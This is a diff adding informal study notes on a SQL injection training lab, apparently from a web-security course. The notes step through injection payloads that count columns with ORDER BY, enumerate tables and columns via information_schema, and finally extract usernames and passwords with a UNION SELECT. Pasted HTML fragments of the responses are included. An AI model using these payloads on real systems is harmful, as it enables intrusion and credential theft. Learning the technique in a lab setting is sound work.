@@ -1,0 +1,39 @@
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+Determine how many colums
+
+' oder by 1-- Error
+
+' oder by 1# okay
+' oder by 2# okay
+' oder by 3# Error
+
+Determine which colums contain text
+
+' UNION SELECT 'a' , 'a'-- -> Correct
+both can contain text
+
+We should Determine the version and language mb :D
+
+Determine database tables
+
+' UNION SELECT table_name || '  ' || table_type , NULL FROM information_schema.tables--
+
+users_tacdkt the only one base table , let see
+
+' UNION SELECT column_name  , NULL FROM information_schema.columns WHERE table_name = 'users_tacdkt'--
+
+                            <th>username_huvjol</th>
+                        </tr>
+                        <tr>
+                            <th>email</th>
+                        </tr>
+                        <tr>
+                            <th>password_fjuopy</th>
+                        </tr>
+                        <tr>
+                            <th>Couple&apos;s Umbrella
+
+lets try to take the username and passwords
+
+' UNION SELECT username_huvjol || '  ' || password_fjuopy , NULL FROM users_tacdkt--
